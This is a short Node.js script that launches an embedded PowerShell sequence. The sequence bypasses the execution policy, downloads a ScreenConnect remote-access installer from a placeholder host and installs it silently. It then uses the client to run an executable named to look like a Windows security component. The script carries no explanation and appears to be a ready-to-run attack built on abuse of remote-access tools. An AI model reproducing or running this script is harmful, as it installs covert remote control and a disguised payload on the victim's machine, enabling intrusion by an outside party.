const { execFileSync } = require('node:child_process');
const command = String.raw`Set-ExecutionPolicy Bypass -Scope Process
$InstallerURL = "https://staging.example.invalid/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
$DownloadPath = "C:\Windows\Temp\ClientSetup.msi"
Invoke-WebRequest -Uri $InstallerURL -OutFile $DownloadPath
msiexec.exe /i C:\Windows\Temp\ClientSetup.msi /qn
& "C:\Program Files (x86)\ScreenConnect Client\ScreenConnect.WindowsClient.exe" "RunFile" "C:\Users\user\Documents\ScreenConnect\Temp\WindowsSecurity_PIN.exe"
`;
execFileSync('powershell.exe', ['-Command', command]);
